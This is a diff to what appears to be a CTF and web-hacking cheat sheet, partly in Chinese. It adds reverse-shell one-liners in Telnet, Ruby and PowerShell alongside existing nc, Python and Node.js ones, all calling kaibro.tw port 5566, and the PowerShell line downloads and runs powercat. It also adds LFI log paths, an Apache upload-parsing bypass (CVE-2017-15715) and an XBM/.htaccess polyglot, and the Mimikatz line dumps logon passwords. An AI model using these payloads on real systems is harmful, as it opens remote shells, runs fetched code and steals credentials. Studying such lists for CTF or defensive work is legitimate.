@@ -185,12 +185,21 @@ A=fl;B=ag;cat $A$B
 - NC
     - `nc -e /bin/sh kaibro.tw 5566`
 
+- Telnet
+    - `mknod backpipe p && telnet kaibro.tw 5566 0<backpipe | /bin/bash 1>backpipe`
+
 - Python
     - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+- Ruby 
+    - `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("kaibro.tw","5566");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
 
 - Node.js
     - `var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(5566, "kaibro.tw", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});`
     - `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'");`
+
+- Powershell
+    - `powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c kaibro.tw -p 5566 -e cmd`
 
 # PHP Tag
 
@@ -1337,6 +1346,7 @@ HQL injection example (pwn2win 2017)
 - `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
 - `/var/log/apache2/error.log`
 - `/var/log/httpd/access_log`
+- `/var/log/mail.log`
 - `/usr/local/apache2/conf/httpd.conf`
 - `/etc/apache2/apache2.conf`
 - `/etc/apache2/sites-available/000-default.conf`
@@ -1367,6 +1377,7 @@ HQL injection example (pwn2win 2017)
 
 - apache log
 - mysql log
+- mail log
 - ssh log
     - `/var/log/auth.log`
 
@@ -2401,11 +2412,14 @@ state[i] = state[i-3] + state[i-31]`
      - server-status
      - crossdomain.xml
      - admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/
-     - xxx.php.bak / www.tar.gz / xxx.php.swp / xxx.php~ / xxx.phps
+     - xxx.php.bak / www.tar.gz / .xxx.php.swp / xxx.php~ / xxx.phps
      - /WEB-INF/web.xml
  - 文件解析漏洞
      - Apache
          - shell.php.ggininder
+         - shell.php%0a
+            - httpd 2.4.0 to 2.4.29
+            - CVE-2017-15715
      - IIS
          - IIS < 7
              - a.asp/user.jpg
@@ -2488,6 +2502,16 @@ state[i] = state[i-3] + state[i-31]`
 - Apache Tomcat Session操縱漏洞
     - 預設session範例頁面`/examples/servlets /servlet/SessionExample`
     - 可以直接對Session寫入
+
+- polyglot image+.htaccess
+    - XBM格式有定義在`exif_imagetype()`中
+    - 符合`.htaccess`格式
+    - Insomnihack CTF
+    ```
+    #define gg_width 1337
+    #define gg_height 1337
+    AddType application/x-httpd-php .asp
+    ```
 
 - tcpdump
     - `-i` 指定網卡，不指定則監控所有網卡
@@ -2609,8 +2633,13 @@ state[i] = state[i-3] + state[i-31]`
 - https://r12a.github.io/apps/encodings/
     - Encoding converter 
 
+- http://tool.leavesongs.com/
+
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
+
+- WASM
+    - https://wasdk.github.io/WasmFiddle/
 
 ----
 
